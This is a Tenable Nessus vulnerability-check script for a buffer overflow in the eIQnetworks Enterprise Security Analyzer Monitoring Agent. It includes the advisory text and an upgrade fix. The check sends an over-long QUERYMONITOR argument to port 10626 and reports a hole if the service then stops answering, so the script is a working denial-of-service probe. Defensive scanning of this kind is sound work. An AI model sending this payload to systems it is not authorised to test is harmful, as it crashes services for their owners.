#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote host contains an application that is vulnerable to a remote
buffer overflow attack. 

Description :

The version of eIQnetworks Enterprise Security Analyzer, Network
Security Analyzer, or one of its OEM versions installed on the remote
host contains a buffer overflow in its Monitoring Agent service. 
Using a long argument to a command, an unauthenticated remote attacker
may be able to leverage this issue to execute arbitrary code on the
affected host with LOCAL SYSTEM privileges. 

See also :

http://www.tippingpoint.com/security/advisories/TSRT-06-07.html
http://lists.grok.org.uk/pipermail/full-disclosure/2006-August/048585.html
http://www.eiqnetworks.com/support/Security_Advisory.pdf

Solution :

Upgrade to Enterprise Security Analyzer 2.1.14 / Network Security
Analyzer 4.5.4 / OEM software 4.5.4 or later. 

Risk factor : 

Critical / CVSS Base Score : 10 
(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N)";


if (description)
{
  script_id(22196);
  script_version("$Revision: 1.1 $");

  script_bugtraq_id(19424);

  script_name(english:"eIQnetworks Enterprise Security Analyzer Monitoring Agent Command Argument Buffer Overflow  Vulnerability");
  script_summary(english:"Tries to crash ESA monitoring agent with a long argument to QUERYMONITOR");
 
  script_description(english:desc);
 
  script_category(ACT_DENIAL);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("esa_monitoring_detect.nasl");
  script_require_ports("Services/esa_monitoring", 10626);

  exit(0);
}


port = get_kb_item("Services/esa_monitoring");
if (!port) port = 10626;
if (!get_port_state(port)) exit(0);


soc = open_sock_tcp(port);
if (soc) 
{
  send(socket:soc, data:string("QUERYMONITOR&", crap(500), "&&&"));
  res = recv(socket:soc, length:64);
  close(soc);

  # If we didn't get a response...
  if (isnull(res)) 
  {
    # Try to reconnect.
    soc2 = open_sock_tcp(port);
    if (!soc2) security_hole(port);
    else close(soc2);
  }
}
